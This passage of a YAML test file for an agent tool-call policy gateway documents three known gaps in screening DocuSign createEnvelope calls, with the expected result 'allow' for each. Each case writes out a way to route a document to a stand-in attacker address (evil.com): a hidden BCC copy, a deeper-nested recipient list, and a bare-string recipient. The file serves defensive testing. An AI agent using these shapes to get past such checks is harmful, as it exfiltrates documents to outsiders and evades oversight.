    expectedResult: allow

- description: RED-TEAM (documented residual) — createEnvelope with an external
    emailSettings.bccEmailAddresses copy. This nested-under-object BCC-archive shape
    is a KNOWN LIMITATION and is intentionally NOT inspected; the call is allowed.
    Documented in Known limitations. Add a dedicated rule if BCC archiving is used.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: docusign-createEnvelope
      uri: null
    payload:
      name: docusign-createEnvelope
      args:
        emailSubject: MSA for signature
        status: sent
        emailSettings:
          bccEmailAddresses:
            - email: silentcopy@evil.com
        recipients:
          signers:
            - email: legal@approved-counterparty.com
              name: Ada Counterparty
              routingOrder: "1"
  output:
    expectedResult: allow

- description: RED-TEAM (documented residual, extraction depth) — createEnvelope
    that wraps the envelope definition one level deeper under `envelopeDefinition`.
    Recipients at args.envelopeDefinition.recipients are NOT reached by the sweeps
    (which look at args.recipients, composite inline recipients, and top-level args
    arrays), so the external signer is allowed. KNOWN LIMITATION — extend args_obj
    if your gateway's tools/list shows a wrapped body.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: docusign-createEnvelope
      uri: null
    payload:
      name: docusign-createEnvelope
      args:
        envelopeDefinition:
          emailSubject: MSA for signature
          status: sent
          recipients:
            signers:
              - email: attacker@evil.com
                name: Smuggled
                routingOrder: "1"
  output:
    expectedResult: allow

- description: RED-TEAM (documented residual, extraction depth) — createEnvelope
    with a recipient expressed as a bare string instead of an object carrying an
    `email` field. object.get(entry, "email", "") on a string yields "", so the
    address is not extracted and the call is allowed. KNOWN LIMITATION — only
    recipient objects with an `email` field are inspected.
  input:
    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: docusign-createEnvelope
      uri: null
    payload:
      name: docusign-createEnvelope
      args:
        recipients:
          signers:
            - attacker@evil.com
  output:
    expectedResult: allow
